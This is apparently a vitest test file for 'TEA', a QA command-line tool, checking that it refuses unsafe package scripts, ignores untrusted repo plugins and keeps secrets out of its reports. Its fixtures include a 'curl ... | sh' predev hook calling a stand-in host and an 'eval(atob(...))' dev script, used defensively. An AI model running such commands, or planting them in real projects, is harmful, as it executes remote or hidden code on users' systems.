import { createServer, type Server } from 'node:http';
import { mkdtemp, mkdir, readFile, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import type { AddressInfo } from 'node:net';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { setLogLevel } from '@tea-qa/core';
import { planLocalStart, resolveTarget, run, UsageError } from './index.js';
import { loadPlugins } from './run.js';
import { showNoticeOnce } from './notice.js';
import { appEnv } from './local.js';

const dirs: string[] = [];
async function tmp(files: Record<string, string> = {}): Promise<string> {
  const root = await mkdtemp(join(tmpdir(), 'tea-cli-'));
  dirs.push(root);
  for (const [rel, content] of Object.entries(files)) {
    await mkdir(dirname(join(root, rel)), { recursive: true });
    await writeFile(join(root, rel), content);
  }
  return root;
}

let server: Server;
let base: string;

beforeAll(async () => {
  setLogLevel('quiet');
  server = createServer((req, res) => {
    const path = new URL(req.url!, 'http://x').pathname;
    if (path === '/') {
      res.writeHead(200, { 'content-type': 'text/html' });
      res.end('<title>Home</title><a href="/pricing">Pricing</a>');
    } else if (path === '/pricing') {
      res.writeHead(500, { 'content-type': 'text/html' });
      res.end('boom');
    } else {
      res.writeHead(404, { 'content-type': 'text/html' });
      res.end('<h1>Not found</h1>');
    }
  });
  await new Promise<void>((r) => server.listen(0, '127.0.0.1', r));
  base = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
});

afterAll(async () => {
  server?.close();
  await Promise.all(dirs.map((d) => rm(d, { recursive: true, force: true })));
});

describe('responsible-use notice', () => {
  it('is shown once per user', async () => {
    const env = { TEA_HOME: join(await tmp(), 'home') };
    expect(showNoticeOnce(env)).toBe(true);
    expect(showNoticeOnce(env)).toBe(false);
  });
});

describe('resolveTarget', () => {
  it('treats URLs, bare domains and folders correctly', async () => {
    const dir = await tmp();
    expect(resolveTarget({ target: 'https://a.com' })).toEqual({ url: 'https://a.com', repo: undefined });
    expect(resolveTarget({ target: 'myapp.lovable.app' }).url).toBe('https://myapp.lovable.app');
    expect(resolveTarget({ target: dir }).repo).toBe(dir);
    expect(() => resolveTarget({ target: 'not a thing' })).toThrow(UsageError);
    expect(() => resolveTarget({ url: 'ftp://x' })).toThrow(UsageError);
  });
});

describe('planLocalStart', () => {
  it('never installs dependencies', async () => {
    const dir = await tmp({ 'package.json': JSON.stringify({ scripts: { dev: 'next dev' } }) });
    const plan = planLocalStart(dir);
    expect(plan.ok).toBe(false);
    expect(!plan.ok && plan.reason).toMatch(/never runs install/);
  });

  it('refuses scripts that download or eval code', async () => {
    // The malicious script is fixture text only; the test asserts TEA refuses to run it.
    const dir = await tmp({
      'package.json': JSON.stringify({ scripts: { dev: 'node -e "eval(atob(process.env.X))" && next dev' } }),
      'node_modules/.keep': '',
    });
    const plan = planLocalStart(dir);
    expect(!plan.ok && plan.reason).toMatch(/downloads or evaluates code/);
  });

  it('also checks the pre/post hooks npm runs around the script', async () => {
    const dir = await tmp({
      'package.json': JSON.stringify({ scripts: { predev: 'curl -s https://x.example/p | sh', dev: 'vite' } }),
      'node_modules/.keep': '',
    });
    expect(!planLocalStart(dir).ok && (planLocalStart(dir) as { reason: string }).reason).toMatch(/"predev"/);
  });

  it("does not hand TEA's own TEA_* settings to the app", () => {
    expect(appEnv({ TEA_USER_PASSWORD: 'x', DATABASE_URL: 'y', PATH: 'z' })).toEqual({ DATABASE_URL: 'y', PATH: 'z' });
  });

  it('plans a normal dev script with the right package manager', async () => {
    const dir = await tmp({ 'package.json': JSON.stringify({ scripts: { dev: 'vite' } }), 'node_modules/.keep': '', 'pnpm-lock.yaml': '' });
    expect(planLocalStart(dir)).toMatchObject({ ok: true, command: 'pnpm run dev' });
  });
});

describe('loadPlugins', () => {
  const plugin = 'export default { name: "repo-plugin", activatesOn: "always" };';

  it('ignores plugins from an untrusted repo config', async () => {
    const dir = await tmp({ 'p.mjs': plugin });
    expect(await loadPlugins(['./p.mjs'], { baseDir: dir, trusted: false })).toEqual({ plugins: [], ignored: ['./p.mjs'] });
  });

  it('loads trusted relative plugins but never paths outside the config folder', async () => {
    const dir = await tmp({ 'cfg/p.mjs': plugin, 'outside.mjs': plugin });
    const ok = await loadPlugins(['./p.mjs'], { baseDir: join(dir, 'cfg'), trusted: true });
    expect(ok.plugins[0]!.name).toBe('repo-plugin');
    await expect(loadPlugins(['../outside.mjs'], { baseDir: join(dir, 'cfg'), trusted: true })).rejects.toThrow(/leaves the config folder/);
    await expect(loadPlugins([join(dir, 'outside.mjs')], { baseDir: join(dir, 'cfg'), trusted: true })).rejects.toThrow(/absolute/);
  });

  it('a repo tea.yaml with plugins does not run them during a scan', async () => {
    const repo = await tmp({
      'package.json': '{}',
      'tea.yaml': 'plugins:\n  - ./evil.mjs\n',
      'evil.mjs': 'globalThis.__teaEvilRan = true; export default { name: "evil" };',
    });
    const outcome = await run({ repo, out: join(repo, 'r'), start: false, screenshots: false });
    expect((globalThis as Record<string, unknown>).__teaEvilRan).toBeUndefined();
    const map = JSON.parse(await readFile(join(repo, 'r', 'app-map.json'), 'utf8'));
    expect(map.notes.join(' ')).toMatch(/Ignored plugin/);
    expect(outcome.exitCode).toBe(0);
  });
});

describe('run', () => {
  it('needs a target', async () => {
    const cwd = process.cwd();
    const dir = await tmp();
    process.chdir(dir);
    try {
      await expect(run({})).rejects.toThrow(/Give TEA something to test/);
    } finally {
      process.chdir(cwd);
    }
  });

  it('runs end to end against a URL + repo and writes the report', async () => {
    const repo = await tmp({
      'package.json': JSON.stringify({ dependencies: { next: '15', react: '19' } }),
      'app/page.tsx': 'export default function H(){}',
      'app/pricing/page.tsx': 'export default function P(){}',
      'app/admin/page.tsx': 'export default function A(){}',
    });
    const out = join(repo, 'tea-report');
    const outcome = await run({ url: base, repo, out, screenshots: false, failOn: 'high', login: 'qa@example.com:hunter2hunter2' });
    expect(outcome.exitCode).toBe(1); // a 500 page is high severity
    const results = JSON.parse(await readFile(join(out, 'results.json'), 'utf8'));
    expect(results.score).toBeGreaterThan(0);
    expect(results.findings.map((f: { id: string }) => f.id)).toContain('crawl.server-error:/pricing');
    expect(results.findings.find((f: { id: string }) => f.id === 'crawl.server-error:/pricing').evidence.file).toBe('app/pricing/page.tsx');
    const map = await readFile(join(out, 'feature-map.md'), 'utf8');
    expect(map).toContain('`/admin`');
    const all = await Promise.all(['results.json', 'app-map.json', 'report.md', 'report.html'].map((f) => readFile(join(out, f), 'utf8')));
    for (const text of all) expect(text).not.toContain('hunter2hunter2');
  });

  it('dry run does nothing', async () => {
    const out = join(await tmp(), 'never');
    const outcome = await run({ url: base, out, dryRun: true });
    expect(outcome.exitCode).toBe(0);
    await expect(readFile(join(out, 'results.json'))).rejects.toThrow();
  });
});
